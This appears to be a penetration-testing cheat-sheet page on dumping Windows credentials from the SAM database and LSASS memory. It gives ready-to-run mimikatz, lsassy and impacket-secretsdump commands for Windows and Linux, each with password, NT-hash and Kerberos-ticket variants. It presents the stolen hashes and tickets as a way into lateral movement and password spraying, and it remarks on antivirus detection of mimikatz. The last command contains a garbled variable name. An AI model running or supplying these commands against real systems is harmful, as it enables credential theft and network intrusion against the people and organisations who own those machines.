---
label: From Machine
subLabel: (SAM & LSASS dump)
---

# Credentials dump from SAM and LSASS

> **Requirements:**
>
> - You have to be a local administrator on the machine (or SYSTEM).

By dumping the LSASS memory or SAM database, we can get credentials of other local and domain users. The obtained credentials can be used for [lateral movement](/windows-lateral-movement) or [password spraying](password-spraying) attack.

> **WARNING**: Mimikatz is currently very well detected by antiviruses. You can see other options below in the **Mimikatz alternatives** section.

## LSASS dump

LSASS dump can reveal credentials of users currently or recently logged into the system. The most common cached credentials will be NT hashes and Kerberos TGTs.

Windows:

```powershell
.\mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords
```

Linux:

```bash
# Using password
lsassy -u $user -p $password -d $domain $host

# Using NT hash
lsassy -u $user -H $nt_hash -d $domain $host

# Using Kerberos TGT
export KRB5CCNAME=$tgt_ccache_file
lsassy -k $host
```

## SAM dump

SAM dump will return all local users on the system along with their hashed passwords in NT hash form.

Windows:

```powershell
.\mimikatz.exe
> privilege::debug
> token::elevate
> lsadump::sam
```

Linux:

```bash
# Using password
impacket-secretsdump $domain/$user:$password@$host

# Using NT hash
impacket-secretsdump -hashes :$nt_hash $domain/$user@$host

# Using Kerberos TGT
export KRB5CCNAME=$tgt_ccache_file
impacket-secretsdump $hostname -k -no-pass -dc-ip $dc_ipyar
```
